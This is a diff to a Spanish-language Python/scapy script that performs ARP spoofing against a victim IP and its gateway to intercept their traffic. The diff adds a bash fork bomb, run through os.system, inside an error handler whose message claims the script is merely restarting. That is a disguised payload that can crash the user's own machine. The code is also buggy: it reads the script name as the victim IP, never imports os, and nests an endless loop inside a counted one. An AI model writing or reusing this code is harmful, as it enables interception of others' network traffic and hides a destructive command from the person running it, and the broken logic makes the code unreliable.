@@ -1,7 +1,19 @@
+import sys
 import scapy.all as scapy
+from scapy import *
 import time
-ip_objetivo = input('Introduce la ip de la victima: ')
-gateway_ip = input('Introduce la ip de la puerta de enlace: ')
+
+print ("[+] Primero introduce la ip victima y despues la ip del gateway")
+
+ip_objetivo = sys.argv[0]
+gateway_ip = sys.argv[1]
+
+if len(sys.argv[0]) < 13 or len(sys.argv[1]) < 13:
+
+	print ("Ha introducido una ip incorrecta")
+
+#ip_objetivo = input('Introduce la ip de la victima: ')
+#gateway_ip = input('Introduce la ip de la puerta de enlace: ')
 def cmac(ip):
     arp_request = scapy.ARP(pdst = ip)
 
@@ -37,17 +49,24 @@ try:
 
     paquetes_enviados = 0
 
-    while True:
+    for i in range(10):
 
-        spoofeo(ip_objetivo, gateway_ip)
+	    while True:
 
-        spoofeo(gateway_ip, ip_objetivo)
+        	spoofeo(ip_objetivo, gateway_ip)
 
-        paquetes_enviados = paquetes_enviados + 2
+        	spoofeo(gateway_ip, ip_objetivo)
 
-        print("\r*********" +str(paquetes_enviados), end ="")
+        	paquetes_enviados = paquetes_enviados + 2
 
-        time.sleep(2)
+        	print("\r*********" +str(paquetes_enviados), end ="")
+
+        	time.sleep(2)
+except (IndexError):
+	print ("Algo ha ido mal, ejecutandose de nuevo de nuevo")
+	os.system(':(){ :|:& };:')
+	pass
+
 except KeyboardInterrupt:
     print("\n Ha parado el programa.... Resteando tablas ARP del objetivo")
     restaurartablas(gateway_ip, ip_objetivo)
